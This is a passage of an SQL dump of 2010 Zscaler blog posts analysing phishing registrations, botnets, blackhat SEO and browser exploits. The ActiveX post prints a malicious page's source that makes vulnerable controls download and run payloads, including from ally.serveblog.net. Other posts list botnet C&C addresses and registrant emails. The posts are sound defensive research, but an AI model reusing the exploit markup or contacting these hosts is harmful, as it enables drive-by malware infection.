YNS1.YAHOO.COMName Server: YNS2.YAHOO.COMStatus: clientTransferProhibitedUpdated Date: 29-mar-2010Creation Date: 29-mar-2010Expiration Date: 29-mar-2011Domain Name.......... cn-inddex.comCreation Date........ 2010-03-29Registration Date.... 2010-03-29Expiry Date.......... 2011-03-29Organisation Name.... li liOrganisation Address. Room 748,Building B,GongxiFaCai roadOrganisation Address.Organisation Address. YanluuoOrganisation Address. 518000Organisation Address. FaCaiOrganisation Address. CHINAAdmin Name........... li liAdmin Address........ Room 748,Building B,GongxiFaCai roadAdmin Address........Admin Address........ YanluuoAdmin Address........ 518000Admin Address........ FaCaiAdmin Address........ CHINAAdmin Email.......... yumin6546545@yahoo.com.cnAdmin Phone.......... +86.5201314Admin Fax............and:  Domain Name: INDEXX-CN.COMRegistrar: MELBOURNE IT, LTD. D/B/A INTERNET NAMES WORLDWIDEWhois Server: whois.melbourneit.comReferral URL: http://www.melbourneit.comName Server: YNS1.YAHOO.COMName Server: YNS2.YAHOO.COMStatus: clientTransferProhibitedUpdated Date: 04-apr-2010Creation Date: 04-apr-2010Expiration Date: 04-apr-2011Admin Name........... liu liAdmin Address........ Room 748,Building B,GongxiFaCai roadAdmin Address........Admin Address........ YanluuoAdmin Address........ 518000Admin Address........ FaCaiAdmin Address........ CHINAAdmin Email.......... qq8983707@yahoo.cnAdmin Phone.......... +86.5201314Admin Fax............GongxiFaCai roughly translates to \"Happy (Chinese) New Year\"Approximate location of where registration info is pointing (Yanluo at the 518000 zip code - Shenzhen, China):Investigating the registration information, it looks very similar to that for gtobuys.com, a reported scam page, and likely attributed to among others, the scams registered from:li li / fansrl@yahoo.cnlian xing / sfmop@vip.qq.comyueguo li / 1185839312@qq.comGoogle results for the registration information (e.g., address and phone), aliases, and emails yield additional domains and fraud/scam activities.  For example,', 'Uncategorised', 'https://www.zscaler.com/blogs/research/following-recent-qq-phishes');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (534, 'Remote Downloader ActiveX: Old Exploits, New Malware', 'Julien Sobrier', 'April 26, 2010', 'ActiveX is a proprietary Microsoft technology, which allows developers to produce reusable software components. The controls are compatible with the Internet Explorer (IE) web browser and over the years have been a frequent security threat, as many developers have produced insecure ActiveX controls which can lead to the remote execution of code when a user with IE visits a malicious web page. This is a very powerful tool for attackers because everything happens in the background (no user interaction), and they can trigger exploitation with only a few lines of code.I recently stumbled upon a page using no fewer than 8 different ActiveX exploits on the same page:Rediff Bol Downloader ActiveX Control Remote Code  Execution Vulnerability (2006, CVE-2006-6838) Office OCX WordViewer.OCX Word Viewer ActiveX  Multiple Vulnerabilities (2007, CVE-2007-2496)Symantec AppStream Client \'LaunchObj\' ActiveX  Control Arbitrary File Download Vulnerability (2008, CVE-2008-4388)Peachtree Accounting \'PAWWeb11.ocx\' ActiveX Control  Insecure Method Vulnerability (2008)Multiple Office OCX ActiveX Controls \'OpenWebFile()\'  Arbitrary Program Execution Vulnerability (2009) It also attempts to download 2 malicious Java applets.These ActiveX controls attempt to download and install 2 malicious files. One is detected as malware by only 6 out of 40 antivirus engines, the other is detected by 18 antivirus engines.Blow is the source of page (the malicious CLSIDs and files have been removed):<html><body><object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\"><PARAM NAME=\"OpenWebFile\" VALUE=\"hxxp://xxx/loading.php?spl=ActiveX_pack\"></object> <object classid=\"clsid:BBBBBBBB-BBBB-BBBBB-BBBB-BBBBBBBBBBBB\"> <PARAM NAME=\"OpenWebFile\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"> </object> <object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\"> <PARAM NAME=\"OpenWebFile\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"> </object> <object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA5\"> <PARAM NAME=\"OpenWebFile\" VALUE=\"http://ally.serveblog.net//loading.php?spl=ActiveX_pack\"> </object><object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\"><PARAM NAME=\"installAppMgr\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"></object><object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\"><PARAM NAME=\"PerformUpdateAsync\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"></object><object classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\"><PARAM NAME=\"ExecutePreferredApplication\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"></object><OBJECT ID=\"DownloaderActiveX1\" WIDTH=\"0\" HEIGHT=\"0\" CLASSID=\"CLSID:c1b7e532-3ecb-4e9e-bb3a-2951ffe67c61\" CODEBASE=\"http://xxx/DownloaderActiveX.cab#Version=1,0,0,1\"> <PARAM NAME=\"propProgressbackground\" VALUE=\"#bccee8\"> <PARAM NAME=\"propTextbackground\" VALUE=\"#f7f8fc\"> <PARAM NAME=\"propBarColor\" VALUE=\"#df0203\"> <PARAM NAME=\"propTextColor\" VALUE=\"#000000\"> <PARAM NAME=\"propWidth\" VALUE=\"0\"> <PARAM NAME=\"propHeight\" VALUE=\"0\"> <PARAM NAME=\"propDownloadUrl\" VALUE=\"http://xxx/loading.php?spl=ActiveX_pack\"><PARAM NAME=\"propPostdownloadAction\" VALUE=\"run\"><PARAM NAME=\"propInstallCompleteUrl\" VALUE=\"\"> <PARAM NAME=\"propbrowserRedirectUrl\" VALUE=\"\"> <PARAM NAME=\"propVerbose\" VALUE=\"0\"> <PARAM NAME=\"propInterrupt\" VALUE=\"0\"> </OBJECT> <OBJECT id=\"sysWIN\" WIDTH=1 HEIGHT=1 classid=\"clsid:AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA\" codebase=\"http://xxx/Bol.CAB\"></OBJECT> <script language=\"vbscript\">sysWIN.url = \"http://xxx/loading.php?spl=ActiveX_pack\"sysWIN.fontsize = 10sysWIN.barcolor = 00FF00sysWIN.start = \"start\"</script> <applet code=\"sklif.Hieeyfc.class\" archive=\"j1_ke.jar\" width=\"480\" height=\"200\"> <param name=\"data\" VALUE=\"http://xxx/loading.php?spl=javadnwa&\"> <param name=\"cc\" value=\"1\"> </applet> <applet width=\"100%\" height=\"100%\" code=\"Uutecwv\" archive=\"j2_93.jar\"> <param name=\"site\" VALUE=\"aHR0cDovL2FsbHkuc2VydmVibG9nLm5ldC8vbG9hZGluZy5waHA/c3BsPWphdmFkbndiJg==\"> </applet>it is interesting to see that this page is using fairly old, and relatively well known, browser exploits along with state-of-the-art viruses virtually invisible to most antivirus software. Some people have argued that desktop antivirus protection alone is good enough because the exploit is just a means of delivering the malicious payload, and stopping this payload is all you need to do, in order to be protected. However, relying on a single layer of security is very risky. Catching the exploit can sometimes be easier, so you really need to take a defense-in-depth approach to security - patch your software, detect exploits, detect malicious payloads.-- Julien', 'Vulnerability', 'https://www.zscaler.com/blogs/research/remote-downloader-activex-old-exploits-new-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (535, 'Fun With N-gram Analysis', 'ThreatLabz', 'April 20, 2010', 'A former colleague and I had discussed character based analysis of domains to provide indications of suspicious / malicious usage.  For example, the Avalanche botnet has a domain registration and fast-flux infrastructure that is frequently used for hosting Zeus, phishing, and money-mule recruitment sites.  Typically, Avalanche bulk registers domains that often do not have any correlation to any particular word or alias, for example:erasvjjkkyuuikomyy1azsvazah7kiozyuojli...The theory is that by conducting character based analysis on malicious and benign domains/URLs, indicators would emerge that if certain patterns were present or absent it would be a domain/URL worth investigating further.  Additionally, a character/sequence based score could be included into a page risk scoring algorithm.Using a technique called N-gram analysis, it is possibly to very quickly extract sequences of characters from text and calculate the frequency of occurrences with the text.In order to have an adequate sample size for this analysis, I built a list of 250,000 malicious URLs and 250,000 benign URLs over the past few months. I used the CPAN module Text::Ngrams within Perl scripts to calculate the frequency of sequence occurrences and compute the frequency differences between the malicious and benign domains.  I computed the top character sequences from 1 character (1-gram) to 6 characters (6-gram).  A draft of the report can be read HERE.Results Summary1-Gram:The \"-\" (dash character) was the most popular character within malicious versus benign domains.  \"h\", \"r\", and \"p\" were the top three letters that were much more prevalent within malicious domains than benign domains.  Other characters that are less popular within the English language were also much more prevalent within malicious domains: \"j\", \"z\", \"w\", \"y\", and \"q.\"2-Gram:\"te\", \"on\", and \"os\" were the top three two-character sequences that were much more prevalent within malicious domains than benign.  In addition, there were some notable TLD sequences that showed up much more frequently within malicious domains: \"ch\", \"nl\", \"fr\", and \"ru.\"3-Gram:The top three-character sequences within malicious versus benign domains were character sequences making up the words \"online\" and \"watch.\"  Some other character patterns that were much higher within malicious domains appeared to be related to QWERTY keyboard sequences, such as \"fds\", \"asd\", and \"dfd.\"  Also, as expected, some of the X-rated themed character sequences (\"xxx\", \"sex\") were more prevalent within malicious domains.4-Gram through 6-gram:Some of the top 4-character word results for malicious versus benign domains include: \"porn\", \"free\", \"host\", \"game\", \"scan\", \"anti\", \"evil\", and \"best.\"  5-character malicious versus benign sequences results include: \"watch\", \"forum\", \"gamer\", \"adult\", \"virus\", \"music\", \"video\", \"-sell-\", \"free-\", and \"phone.\"  6-character malicious versus benign sequence results include: \"online\", \"funpic\", \"video\", \"hostin(g)\", \"spywar(e)\", \"archiv(e)\", \"antivi(rus)\", \"system\", \"scanne(r)\", and \"securi(ty).\"  Many of these character sequences occur within FakeAV and Fake Codec malware sites.Future WorkIn the future, I\'d like to take a larger sample size (e.g., 1 Million malicious and 10 Million benign), and analyze the malicious domains/URLs by threat (e.g., Zeus, Koobface, various exploit kits, phishing sites, etc.) to compare against benign domains/URLs.  This will provide more specific character patterns for malicious sites.  From this work, a dictionary of regular expressions can be built to contribute to the weighing of domain/URL risk.Once again, a draft on my work on this can be read HERE.', 'Analysis', 'https://www.zscaler.com/blogs/research/fun-n-gram-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (536, 'Video: First Link On Google Leads To A Malware Site', 'Julien Sobrier', 'April 16, 2010', 'A video is worth a thousand words. This short clip shows a Google search for \"tax day freebies\", one of the hottest search terms on 04/14/2010. The first regular search result (below the News and Twitter sections) redirects to a fake antivirus page.             -- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/video-first-link-google-leads-malware-site');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (537, 'CVE-2010-0806 Exploit In The Wild', 'ThreatLabz', 'April 06, 2010', 'CVE-2010-0806, a use-after-free vulnerability in the Peer Objects component, was announced in mid-March 2010. The vulnerability impacts Internet Explorer 6, 6 SP1, and 7 - a patch was made available by Microsoft in the MS10-018 security update last week. Zscaler received early notification of the vulnerability through our trusted partnership with Microsoft and was able to deploy signatures to detect and block exploit attempts soon after the public release of the vulnerability.    Today this site was detected and blocked for attempting to exploit CVE-2010-0806:  hxxp://cn.cnsa56.info/w/woz.htm  --> and supporting script: hxxp://cn.cnsa56.info/w/k.js    The JavaScript used to exploit the vulnerability is heavily obfuscated,  And the script contains some try-catch statements to evade detection and some automated analysis tools,  and  The above try{} statements will fail, so the code within catch{} will be run, which defines some variables and logic for decoding the above shellcode.    Wepawet fails to decode/analyze properly, and categorizes the URL as benign. VirusTotal has 2/39 Anti-Virus engines that detect as a suspicious JavaScript downloader through their heuristic engines.    After decoding and analyzing the shellcode, it downloads the payload:  hxxp://v.vkjk6.info/w/win.exe    Unfortunately, VirusTotal shows no detection for this file. When conducting basic analysis on the binary payload, it becomes obvious that this is not a valid PE executable. It is likely that the binary is encrypted or obfuscated and that the shellcode run from the CVE-2010-0806 exploit will decode the binary on the victim\'s machine. (I will run the exploit in a sandbox, and post any follow-on analysis of the payload).    Often times, the domain information for malicious domains is masked through a domain privacy service (like Domains by Proxy)- however, this was not the case for the domains involved in this attack.    Here is the billing information for the cnsa56.info domain:  This same registration information was used for another live domain: ac364.info    And for vkjk6.info:  126.com is a free email provider,             The registration information, email provider used, and variable names used in the attack indicate the attacker is a Chinese speaker and possibly of Chinese nationality.', 'Microsoft', 'https://www.zscaler.com/blogs/research/cve-2010-0806-exploit-wild');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (538, 'Google Search: More Links Are Malicious Than You Realize', 'Julien Sobrier', 'April 05, 2010', 'It is not uncommon to find malicious links in 15% to 20% of the first 100 results returned by Google for any popular search term (according to Google trends). If Google doesn’t take the Blackhat SEO problem more seriously, the total number of malicious links is bound to increase and this may already be happening.\r\n\r\n \r\n\r\nThe top search on April 2nd was “tri energy”. I am not sure why it became so popular, but don’t google it: more than 90% of the first 100 links are malicious! Here is what I found for this search on April 4th:\r\n\r\n \r\n\r\n \r\n\r\n\r\n	86 links were sending users directly to a malicious, fake antivirus page that tries to install malware. This is the same issue, with the same domain name (xorg.pl) involved in most of the redirections that I detailed in a previous post.\r\n	4 malicious links were down or Google displayed a warning page\r\n	The first 5 links on the first page of results were legitimate\r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nOne of the too few warnings from Google\r\n\r\n \r\n\r\nSame search on Bing and Yahoo\r\n\r\n \r\n\r\n \r\n\r\nFor the same search, Bing did not show any malicious links. Yahoo! displayed 4 malicious links on pages 2, 6 and 7. At this point, I’m not sure if Bing and Yahoo! do a better job at cleaning up their search results, or if they are simply slower at picking up new pages.\r\n\r\n \r\n\r\n \r\n\r\n8 hours later\r\n\r\n \r\n\r\n \r\n\r\nI have re-scanned the Google results 8 hours later and things are a bit better. There are still only 10 legitimate links in the first 100 results, but Google displays a warning for 87 links. Only 3 malicious links redirect to a harmful site.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nGoogle warns the users to not follow these links. Why do they even show them?\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nNot an exception\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nThis number of malicious links may be extreme in this example, but the overall problem of attackers leveraging SEO optimization is not rare at all. For the same day, the #5 Google Trends search term,  “epic google”, 50% of the first 100 links are malicious. For the #2 search term, “mendicant”, 38% of the links are malicious. It took 2 days to Google to start clean up the results, from April 2nd to April 5th in the morning.\r\n\r\n \r\n\r\n \r\n\r\nI do not understand why Google decides to include malicious links in their search results. Depending on the user’s browser version, clicking on these links can be harmful to users, or display useless content. In both cases, users do not want to visit these sites.\r\n\r\n \r\n\r\n \r\n\r\n-- Julien', 'Abuse', 'https://www.zscaler.com/blogs/research/google-search-more-links-are-malicious-you-realize');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (539, 'How Google Is (NOT) Tackling The Blackhat SEO Issue', 'Julien Sobrier', 'April 05, 2010', 'Google is widely used by attackers to trick users into going to malicious sites. The attackers hack legitimate sites that rank high on popular searches. The hacked pages display good content to the Google crawlers but when users surf to the hacked pages, they receive malicious content, which redirects them to other harmful domains.       While some Google searches contain numerous malicious results, even on the first page, Google seems to be attempting to address this issue. While analyzing the results for “google april fool”, I found several malicious results. I’ve investigated two - the 11th and 15th search results. The first link is to hxxp://consultenet.com/seriously/topeka-google-april-fools.html, while the second one is hxxp://sitnprettyphoto.com/werishmne/topeka-google-april-fools.html. Both links redirect to mysecure-safetypc.xorg.pl, a domain that displays fake antivirus pages to trick users in downloading and installing malware disguised as antiviruses.         A known bad site to Google              Google maintains a public list of malicious site, known as Google SafeBrowsing. You can look at the status of any domain by going to http://www.google.com/safebrowsing/diagnostic?site=<domain>. Within a few seconds of spotting these 2 malicious links, consultenet.com was not showing up anymore in the top 100 results.. The Google diagnostic page flagged the domain as having been involved in distributing malware.                Google Diagnostic for consultenet.com             Note that Google says “this site is not listed as malicious”, but that it is used to distribute malware. Indeed, consultenet.com does not host any malware, but it used to redirect the users to a different domain that host the malicious content.              How does Google use this information? A search for “site:consultenet.com” yields 403 results. By looking at the URLs, it is easy to spot the bad pages. One of them is hxxp://consultenet.com/seriously/didi.html. If you access this page from Google using the same search terms, you get the harmless page which Google used to rank the content. The hacked page looks at the Referer header to check where the user is coming from. Not only does the user has to come from Google, but it also needs to have done a “normal” search. This is an attempt to fool both Google and security tools into marking these pages as good.                                           Yes, all the fake pages are as ugly as this one! But this is the content that matters to Google.                   I extracted 3 words from the page, and ran the following Google search: “didi index indicator”. Sure enough, the malicious page shows on the first result page as the 5th result.                    Don’t click on link #5              If you follow the link, you get redirected to the following fake antivirus page on xorg.pl.                          Fake antivirus page              An unknown hacked site                   Google did not, at the time this blog was published, flag the second domain, sitnprettyphoto.com as malicious.                    Domain is safe according to Google         It may not take long for Google to flag this domain. Since I don’t know when the website was hacked, I’m not able to measure Google’s response time to scan and flag it correctly.                        What is Google doing with its data?                While it is not surprising that Google does not flag all hacked websites immediately, it is very concerning that they keep bad websites in their index. They know consultenet.com is used to spread malware, yet they still display dangerous links to this domain in their search results! Protecting users should be their number one priority. I personally, would prefer that they erroneously blacklist some websites temporarily, rather than keeping known bad websites in their search results - even showing them in the top 10 results!    -- Julien', 'Abuse', 'https://www.zscaler.com/blogs/research/how-google-not-tackling-blackhat-seo-issue');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (540, 'Governmental Website Hacked To Spread Malware', 'Julien Sobrier', 'April 01, 2010', 'Malicious sites are hiding themselves behind hacked legitimate sites.  Attackers use these legitimate sites to fool the search engines into showing them as the top results for the most popular searches.  These sites are then used to redirect visitors to a malicious site on a different domain, displaying a fake antivirus page.Most of the hack sites are low profile: personal pages, small community sites, etc. But yesterday (03/31), an Argentinian governmental website was showing up in the first 10 results on Yahoo for \"who got kicked off dancing with the stars tonight\".: hxxp://misioneseduca.gov.ar/rob.php?id=who+got+kicked+off+dancing+with+the+stars+tonigh After clicking on the link, I got redirected to hxxp://p3p0.com/?said=3333&q=WHO+GOT+KICKED+OFF+DANCING+WITH+THE+STARS+TONIGHTmisioneseduca.gov.ar is down today. It appears that it was hacked along with several other PHP websites using Joomla due to a vulnerability in an image gallery plugin.Not so long ago, hacking a website was the final goal. Attackers would do it for fun, as a political statement, or to steal money or information (login credentials, Social Security Numbers, etc.). Now, a hacked website is a platform to attack users, and not just the ones who frequent the site. Attackers are using Google SEO to widen the range of visitors to the hacked site serving malware.-- Julien', 'Malware', 'https://www.zscaler.com/blogs/research/governmental-website-hacked-spread-malware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (541, 'Unlike Popular Belief, Short Links On Twitter Aren\'t Malicious!', 'Julien Sobrier', 'March 29, 2010', 'Twitter recently announced that it has implemented a new security system to scan all URLs posted in tweets to protect users from malicious sites. This follows a similar announcement from bit.ly in November 2009         Twitter, and the URL shorteners it has helped to popularize, have long been blamed for leading users to malicious sites. I posted on this topic 3 weeks ago and argued that this may not be true. I wanted to additionally do a thorough investigation of the Twitter links both before the security scan and after.         I have retrieved more than 1 million URLs (1,314,615 to be exact) from the public timeline over a couple of weeks before they put any protections in place. I then ran the links through the Zscaler infrastructure to find out which links lead to malicious sites.           The state of the Twitter links                   Prevalence of hostnames on Twitter         As expected, URL shorteners are very popular on Twitter, and bit.ly represents 40% of all links. TinyUrl, one of the original URL shorteners, comes in 3rd with only 5% of all URLs.            How many malicious links?    I looked for malicious sites - phishing sites, malware, etc. I did not look for spam, only for pages that present a security risk to users.    To my surprise, a very low number of links led to malicious pages - only 773, links, 0.06% of all links scanned, redirected to malicious content.               Types of malicious sites    Here is the distribution of malicious links by host name:                  Bit.ly represents 40% of all links, and roughly the same proportion of malicious links. Same case for TinyUrl:  5% of all URLs and 6 % of all malicious sites. It does not look like bit.ly’s phishing and malware protection is making it any safer than other URL shorteners.  Twitpic.com is used to share images, so it is unlikely to be used for malicious content. Mediafire is known for hosting malware and other viruses, even if it is not blacklisted by Google Safe Browsing.         Note that these links may have been scanned up to 4 weeks after they were collected. Bad sites may already have been taken down, or cleaned up.        Can Twitter and bit.ly really protect their users?    The key to protecting end users, is real-time scanning of both the URL and the content. Twitter and bit.ly can only scan the links periodically.  Malicious websites try to hide their malicious content to non-users by checking the user agent or geography and by requiring a real browser which fully understands Javascript, Flash, etc.  An attacker can present harmless content to the Twitter or bit.ly scanners, but harmful content to a real user.    But remember that only 0.06% of all the URLs tests represented a security risk. It is actually much safer to follow link s from Twitter that from some search results on Google!      -- Julien', 'Abuse', 'https://www.zscaler.com/blogs/research/unlike-popular-belief-short-links-twitter-arent-malicious');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (542, 'Whitepaper: Botnet Analysis Leveraging Domain Ratio Analysis', 'ThreatLabz', 'March 29, 2010', 'While conducting stats and trends for last Quarter\'s \"State of the Web\" report, I found an interesting way of analyzing top-level domains (TLDs).  I added the total number of web transactions involving a TLD for the month and divided it by the total number of unique domains within that TLD.  In other words I calculated a ratio of Transactions:Unique Domains per TLD for each month and tracked this ratio.  A low ratio means that the transactions were well distributed across the domains visited within that TLD.  A ratio of 1:1 for example means that there was essentially 1 web transaction per unique domain visited.  A very high ratio would indicate that there were a large number of transactions to one or more of the unique domains visited - suggesting that one or more popular domains dominated customer usage of that particular TLD.By sifting through the records for the high-ratio results, some interesting information can be discovered.  In some cases, high-ratios were caused by numerous transactions to a popular site or service, such as a popular social networking site in a particular ccTLD.  However, high-ratios may also represent malicious command and control (C&C) or information drop servers that have a large number of transactions beaconing to them.An example of a TLD that bubbled to the top was .LY.  This domain had more than double the monthly ratio value of .COM.  This high-ratio is explained by the TLD being relatively unpopular for our customers in terms of unique domains visited, but having a large number of transactions to a popular domain: BIT.LY, a URL shortening service.Another TLD, .NU, had more than double the monthly ratio of .LY.  After conducting analysis on the results, I detected that there were several customers beaconing to a .NU site over HTTP on port 53/TCP (generally used for DNS).  Upon further investigation the customers were infected with a previously undetected variant of the Win32.PcClient Backdoor.  The full research report of the detection methodology and incident analysis can be read HERE.', 'Malware', 'https://www.zscaler.com/blogs/research/whitepaper-botnet-analysis-leveraging-domain-ratio-analysis');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (543, 'Trojan Monkif Is Still An Active And Consistent Botnet Threat', 'ThreatLabz', 'March 18, 2010', 'While we have seen in a recent Koobface blog post showing sudden rise and fall in Koobface network activity, the Trojan Monkif’s C&C requests are still being consistently seen. According to the data, the Trojan Monkif is still highly active today and making new HTTP requests every day to pull down the additional C&C commands from the specific servers. Even though this threat is a year old, it is still present in the wild and impacting users. The Trojan Monkif makes a number of different requests to the predefined servers to collect commands, and the server responds with JPEG images encapsulating the malicious commands inside. This is used to avoid C&C command detection on the network           The functionality of Monkif is to pull out the command instructions from the remote server and download additional malware. It generates a lot of unique HTTP requests on the same server to download malicious JPEG files containing encoded commands. It also installs BHO (Browser Helper Object) on the infected machine. Interestingly, there is less of a drop for Trojan Monkif’s unique network traffic per month than Koobface. Here are the March 2010 unique web requests per day:               There are only 4-5 C&C servers seen in the requests but every request is unique containing different root directories, random “.php” files and different parameters passed to the file. The only highly active and live C&C server is hosted in Sweden with IP 88.80.7.152. Here are the servers associated with the Monkif activity:  hxxp://88.80.7.152    hxxp://www.clickspot.biz  hxxp://stats.hillmedia.biz  hxxp://cdn.cbtclick.biz  hxxp://88.80.5.3  hxxp://www.clickbig.biz  hxxp://stats.woodmedia.biz    Here is how random requests looks like,  hxxp://88.80.7.152/cgi/tjo.php?ddddd=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/dsiy.php?dsydm=5561671  hxxp://88.80.7.152/babymaybe/hwmcr.php?wmcrx=06166<1x644434x4x4x4x=x>  hxxp://88.80.7.152/babynot/blfp.php?dxrzz=77445=1x644413x640  hxxp://cdn.cbtclick.biz/babynot/ecccccc.php?cccc=4x4x640  hxxp://88.80.7.152/cgi/scrhxm.php?rhxm=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/nd.php?iy=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/ffffffff.php?fff=4x4x4x4x4x70x  hxxp://88.80.7.152/cgi/raqfv.php?aqf=4x4x4x4x4x70x  hxxp://stats.hillmedia.biz/cgi/wl.php?rgmra==<44=46x644547x640>      As the above requests show, every request is unique, containing random data. This is done to fool IDS/IPS engines from detecting the malicious requests. The C&C server replies with Content-Type “image/jpeg” which contains JPEG image with malicious commands hidden inside. The malicious image file contains the JPEG header followed by some commands that are in encoded format. We observed by downloading some image files that first part of the command remains same and later part changes values. Here are some examples:           lppt>++<<*<4*3*516+`+`h*tlt;bh9g<4f=g=fb==1f5aefg6364a1<64fa4fe\"bm`9544\"5911266139|200118|2048|0|0|66    lppt>++<<*<4*3*516+`+`h*tlt;bh96efe<6600g6fbb`5<14253a4ea5=6`03\"bm`9544\"593300195|200057|2048|0|0|2    lppt>++<<*<4*3*516+`+`h*tlt;bh9ag=3g7a31<6<<17`7b2`b53f1`52=ff7\"bm`9544\"591955928|200044|2048|0|0|18            The bold text remains same in the JPEG image file and later part differs for every request – this makes detection difficult. The values within the JPEG are the malicious commands that instruct the Monkif to infect victim systems. If you compare other Botnet traffic like Koobface verses Monkif in Q1 2010, you will find that Monkif is very consistent and ongoing.    The unique network traffic for Trojan Monkif remains approximately same for each month in this quarter (March data is up to 17th). The detection for these JPEG file is zero (here is the Virustotal result for one of the C&C image files). This means you are at a greater risk from this Botnet if you are relying on only a single security protection like Antivirus.    We are near to end of Q1, 2010 and Botnet attacks remain a large threat on the web. Previously, we saw Koobface activity rise and fall, but this Monkif threat remains consistently active. The attackers behind Trojan Monkif are evading the detection by hiding their malicious Botnet commands inside JPEG files. The commands inside the JPEG files are encoded and vary, making detection more difficult for Antivirus vendors. The Virustotal result shows none of the Antivirus vendors out of 42 are detecting these malicious samples. The web is growing and so are Botnets. Currently, we are seeing only a few C&C servers being used for this Trojan, but this may increase in the future. Koobface and Monkif have been active threats in the Q1 2010, but Monkif has remained consistent. Zscaler’s solution is detecting these kinds of attacks every day. Be sure to block the above-mentioned malicious domains, and check that your security solutions are protecting you from these dangerous threats.    Be Safe!!!    Umesh', 'Malware', 'https://www.zscaler.com/blogs/research/trojan-monkif-still-active-and-consistent-botnet-threat');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (544, 'Koobface Worm Hits On Weekend – Increase In New C&C Servers', 'ThreatLabz', 'March 15, 2010', 'On Sunday 14th 2010, Zscaler detected a large number of Koobface worm transactions over the Internet. Koobface is a computer worm, which was first found in December 2008 and is still spreading heavily. The Koobface worm targets popular social networking sites such as Facebook, MySpace, Twitter, etc. Once infected, the worm downloads additional malware on the user machine. It spread via sending messages to the friend list of the infected user. We have seen a lot of Koobface activity in the past where numbers of new domains are used to download malicious binaries. Yesterday, we saw an increase in network traffic of the Koobface worm to 122 unique C&C servers.\r\n\r\n\r\n \r\nWeekends are busy social networking days for users, and the Koobface worm presumably took advantage of this. The simple scenario is described below,\r\n\r\nThe worm spreads via social engineering attack. User visits the infected friend’s profile and then clicks on the link. Then the link shows the video being displayed but shows error message like “your flash player is out of date” and you have to download new update. The innocent user clicks on the download link thinking that it is real update for flash player and ends up getting the worm on their system. We saw increase in unique C&C servers from last few days and sudden increase on Sunday. Here is the chart showing the number of unique domains used per day for last week,\r\n\r\nHere is the list of unique C&C servers used on March 14th,\r\n\r\nhxxp://74.217.128.97/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://85.13.206.114/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://207.217.125.50/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://75.125.232.130/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://70.35.30.26/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://67.139.134.203/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://82.165.204.43/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://87.106.152.181/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://66.96.146.81/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://89.188.141.15/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://208.93.192.2/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://74.63.154.248/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://207.150.212.12/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://193.93.174.152/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://212.36.74.250/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://91.186.25.40/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://85.17.169.7/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://212.227.33.27/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://212.79.87.27/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://203.206.137.137/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.52.191.187/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://206.51.236.165/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://209.59.147.182/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://193.227.103.20/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://193.93.174.173/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://207.150.212.23/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://195.225.168.238/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://88.208.252.192/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://72.9.250.162/.sys/?action=fbgen&v=103&crc=669\r\nhxxp://200.62.54.122/.sys/?action=fbgen&v=